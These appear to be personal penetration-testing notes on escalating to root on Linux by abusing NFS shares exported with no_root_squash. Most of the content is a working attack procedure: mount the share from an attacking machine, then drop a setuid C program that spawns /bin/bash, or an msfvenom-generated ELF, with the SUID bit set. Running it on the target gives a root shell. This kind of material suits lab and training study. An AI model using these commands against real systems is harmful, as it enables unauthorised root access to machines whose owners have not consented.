
# What it is?
just like ftp, smb

```
cat /etc/exports
```

config file of NFS

![[Pasted image 20240511000545.png]]

### Root Squash

Files created via NFS inherit the remote user's ID. If the user is root, and **root squashing is enabled**, the ID will instead be set to the "nobody" user.

![[Pasted image 20240511103732.png]]

mount one of the “no_root_squash” shares to our attacking machine and start building our executable

```
mkdir /tmp/backup
```

```
mount -o rw,vers=2 MACHINE_IP:/backups /tmp/backup


sudo mount -t nfs <FQDN/IP>:/full/path/to/share/from/showmount ./target-nfs/ -o nolock (normal mount)
```

we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job

> [!NOTE]
> We must need to this as root user in our kali

#### nfs.c
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/backup/nfs.c
```

compile it

```
gcc /tmp/backup/nfs.c -o /tmp/backup/nfs
```

#### msfvenom (preferable way)
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```

set SUID

```
chmod +sx /tmp/backup/nfs
```

![[Pasted image 20240511104350.png]]


**NOW GO TO LINUX MACHINE**

nfs and nfs.c should be there
just run it as it's already have SUID by root in kali

```
/backup/nfs

	OR
	
/backup/shell.elf
```

![[Pasted image 20240511104753.png]]

basically what this means is, if we mount that share and set any file there with root user in out kali then `no root sqaushing` allow that file as created by root and as it have SUID we get root shell when we run it